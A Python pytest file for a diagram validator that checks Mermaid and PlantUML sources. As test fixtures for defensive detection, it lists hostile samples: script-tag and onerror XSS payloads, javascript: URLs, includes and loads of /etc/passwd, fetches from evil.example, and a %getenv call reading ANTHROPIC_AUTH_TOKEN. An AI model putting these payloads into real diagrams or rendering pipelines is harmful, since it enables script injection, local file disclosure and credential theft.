from __future__ import annotations

import os
import stat
from pathlib import Path

import pytest

from docugen.verify.diagram_check import check_mermaid, check_plantuml, check_source, render_check

MERMAID_OK = [
    "flowchart TD\n  A[Start] --> B{Check}\n  B -->|yes| C[Done]\n",
    "graph LR\n  a --> b\n",
    "sequenceDiagram\n  Client->>Api: POST /var/compute\n  Api-->>Client: 202\n",
    "classDiagram\n  class Session {\n    +String id\n  }\n  Session --> Box\n",
    "stateDiagram-v2\n  [*] --> Queued\n  Queued --> Running\n",
    "stateDiagram\n  [*] --> A\n",
    "erDiagram\n  USER ||--o{ JOB : submits\n",
    "---\ntitle: Flow\n---\nflowchart TD\n  A --> B\n",
    "%% a comment first\nflowchart TD\n  A --> B\n",
]

PLANTUML_OK = [
    "@startuml\ncomponent Api\ncomponent Box\nApi --> Box\n@enduml\n",
    "@startuml\nactor User\nUser --> (Upload)\n@enduml\n",
    "@startuml\nnode Fargate {\n  [Box]\n}\n@enduml\n",
    "@startuml\nstart\n:step;\nstop\n@enduml\n",
    "@startuml\n!pragma teoz true\nA -> B\n@enduml\n",
]


@pytest.mark.parametrize("src", MERMAID_OK)
def test_clean_mermaid(src: str) -> None:
    assert check_mermaid(src, "d.mmd") == []


@pytest.mark.parametrize("src", PLANTUML_OK)
def test_clean_plantuml(src: str) -> None:
    assert check_plantuml(src, "d.puml") == []


MERMAID_BAD = [
    ("mermaid-click", 'flowchart TD\n  A --> B\n  click A href "https://evil.example" _blank\n'),
    ("mermaid-click", "flowchart TD\n  A --> B\n  click A callback\n"),
    ("mermaid-directive", '%%{init: {"securityLevel": "loose"}}%%\nflowchart TD\n  A --> B\n'),
    ("mermaid-directive", '%%{init: {"themeCSS": ".x{background:url(http://evil.example)}"}}%%\nflowchart TD\n  A --> B\n'),
    ("mermaid-directive", "%%{\n  init: {\n    'secure': []\n  }\n}%%\nflowchart TD\n  A --> B\n"),
    ("mermaid-directive", "---\nconfig:\n  securityLevel: loose\n---\nflowchart TD\n  A --> B\n"),
    ("mermaid-html", "flowchart TD\n  A[<script>alert(1)</script>] --> B\n"),
    ("mermaid-html", 'flowchart TD\n  A["<img src=x>"] --> B\n'),
    ("mermaid-html", 'flowchart TD\n  A["<iframe src=x>"] --> B\n'),
    ("mermaid-event", 'flowchart TD\n  A["x onerror=alert(1)"] --> B\n'),
    ("mermaid-url-scheme", "flowchart TD\n  A[javascript:alert(1)] --> B\n"),
    ("mermaid-type", "gantt\n  title x\n"),
    ("mermaid-type", "zenuml\n  A.method()\n"),
    ("mermaid-type", "pie\n  \"a\": 1\n"),
    ("mermaid-type", "not a diagram\n"),
    ("mermaid-type", ""),
]


@pytest.mark.parametrize("rule,src", MERMAID_BAD, ids=[f"{r}-{i}" for i, (r, _) in enumerate(MERMAID_BAD)])
def test_hostile_mermaid(rule: str, src: str) -> None:
    assert rule in {f.rule for f in check_mermaid(src, "d.mmd")}


PLANTUML_BAD = [
    ("plantuml-include", "@startuml\n!include /etc/passwd\n@enduml\n"),
    ("plantuml-include", "@startuml\n!includeurl http://evil.example/x.puml\n@enduml\n"),
    ("plantuml-include", "@startuml\n  !INCLUDE ../../secret.iuml\n@enduml\n"),
    ("plantuml-include", "@startuml\n!include_many x.puml\n@enduml\n"),
    ("plantuml-include", "@startuml\n!import foo.zip\n@enduml\n"),
    ("plantuml-theme", "@startuml\n!theme plain from https://evil.example/themes\n@enduml\n"),
    ("plantuml-function", '@startuml\ntitle %getenv("ANTHROPIC_AUTH_TOKEN")\n@enduml\n'),
    ("plantuml-function", '@startuml\n!$x = %load_json("/etc/passwd")\n@enduml\n'),
    ("plantuml-function", '@startuml\ntitle %file_exists("/etc/passwd")\n@enduml\n'),
    ("plantuml-image", "@startuml\nnote left: <img:http://evil.example/p.png>\n@enduml\n"),
    ("plantuml-image", "@startuml\nnote left: <img:/etc/passwd>\n@enduml\n"),
    ("plantuml-sprite-url", "@startuml\nsprite $x jar:archimate/app-service\n@enduml\n"),
    ("plantuml-link", "@startuml\n[A] --> [B] [[https://evil.example link]]\n@enduml\n"),
    ("plantuml-url-scheme", "@startuml\nnote: javascript:alert(1)\n@enduml\n"),
    ("plantuml-pragma", "@startuml\n!pragma graphviz_dot jdot\n@enduml\n"),
    ("plantuml-type", "@startdot\ndigraph g { a -> b }\n@enddot\n"),
    ("plantuml-type", "@startditaa\n+--+\n@endditaa\n"),
    ("plantuml-type", "A -> B\n"),
    ("plantuml-type", "@startuml\nA -> B\n@enduml\n@startlatex\nx\n@endlatex\n"),
    ("plantuml-multiple", "@startuml\nA -> B\n@enduml\n@startuml\nC -> D\n@enduml\n"),
]


@pytest.mark.parametrize("rule,src", PLANTUML_BAD, ids=[f"{r}-{i}" for i, (r, _) in enumerate(PLANTUML_BAD)])
def test_hostile_plantuml(rule: str, src: str) -> None:
    assert rule in {f.rule for f in check_plantuml(src, "d.puml")}


def test_size_limits() -> None:
    assert "too-large" in {f.rule for f in check_mermaid("flowchart TD\n" + "A-->B\n" * 40000, "d.mmd")}
    assert "too-many-lines" in {f.rule for f in check_plantuml("@startuml\n" + "A->B\n" * 6000 + "@enduml\n", "d.puml")}


def test_dispatch_by_extension() -> None:
    assert check_source("flowchart TD\n A-->B\n", "x.mmd") == []
    assert check_source("@startuml\nA -> B\n@enduml\n", "x.puml") == []
    assert [f.rule for f in check_source("x", "x.txt")] == ["diagram-extension"]


# ── render_check, with stand-in renderers (the real ones are exercised by the image's smoke test) ──

def fake_tool(tmp_path: Path, name: str, body: str) -> str:
    p = tmp_path / name
    p.write_text("#!/bin/sh\n" + body + "\n")
    p.chmod(p.stat().st_mode | stat.S_IXUSR)
    return str(p)


def test_render_check_passes_and_fails_on_the_exit_code(tmp_path: Path) -> None:
    src = tmp_path / "d.puml"
    src.write_text("@startuml\nA -> B\n@enduml\n")
    assert render_check(str(src), plantuml=fake_tool(tmp_path, "ok", "exit 0")) == []
    found = render_check(str(src), plantuml=fake_tool(tmp_path, "bad", "echo 'Syntax Error?' >&2; exit 200"))
    assert [f.rule for f in found] == ["plantuml-syntax"] and "Syntax Error" in found[0].message
    m = tmp_path / "d.mmd"
    m.write_text("flowchart TD\n A-->B\n")
    found = render_check(str(m), mmdc=fake_tool(tmp_path, "mm", "echo 'Parse error on line 2' >&2; exit 1"))
    assert [f.rule for f in found] == ["mermaid-render"]


def test_render_check_missing_renderer_and_timeout(tmp_path: Path) -> None:
    src = tmp_path / "d.puml"
    src.write_text("@startuml\nA -> B\n@enduml\n")
    assert [f.rule for f in render_check(str(src), plantuml=str(tmp_path / "nope"))] == ["renderer-missing"]
    slow = fake_tool(tmp_path, "slow", "sleep 5")
    assert [f.rule for f in render_check(str(src), plantuml=slow, timeout=1)] == ["plantuml-syntax"]


def test_render_check_does_not_pass_the_environment_on(tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> None:
    monkeypatch.setenv("DOCUGEN_TEST_TOKEN", "should-not-leak")
    src = tmp_path / "d.puml"
    src.write_text("@startuml\nA -> B\n@enduml\n")
    probe = fake_tool(tmp_path, "probe", 'test -z "$DOCUGEN_TEST_TOKEN" || { echo leaked >&2; exit 3; }')
    assert render_check(str(src), plantuml=probe) == []
    assert os.environ["DOCUGEN_TEST_TOKEN"] == "should-not-leak"
